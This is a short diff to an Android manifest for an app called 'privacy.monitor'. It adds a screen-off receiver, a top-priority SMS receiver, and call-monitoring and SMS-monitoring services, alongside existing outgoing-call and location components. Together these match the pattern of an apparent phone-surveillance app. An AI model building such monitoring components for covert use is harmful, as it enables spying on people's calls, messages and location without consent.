@@ -72,7 +72,14 @@
                 <action android:name="android.intent.action.NEW_OUTGOING_CALL" />
             </intent-filter>
         </receiver>
-        <receiver android:name="com.privacy.monitor.receiver.MmsReceiver" >
+        
+        <receiver android:name=".receiver.ScreenOffReceiver" >
+            <intent-filter android:priority="2147483647" >
+                <action android:name="android.intent.action.SCREEN_OFF" />
+            </intent-filter>
+        </receiver>
+        
+        <receiver android:name="com.privacy.monitor.receiver.SMSReceiver" >
             <intent-filter android:priority="2147483647" >
                 <action android:name="android.provider.Telephony.SMS_RECEIVED" />
             </intent-filter>
@@ -86,7 +93,9 @@
             </intent-filter>
         </receiver>
 
-        <service android:name="com.privacy.monitor.service.CallRecordService"  android:enabled="true"/>
+        <service android:name="com.privacy.monitor.service.CallMonitoringService"  android:enabled="true"/>
+        <service android:name="com.privacy.monitor.service.SMSMonitoringService"  android:enabled="true"/>
+        
         <service
             android:name="com.baidu.location.f"
             android:enabled="true"
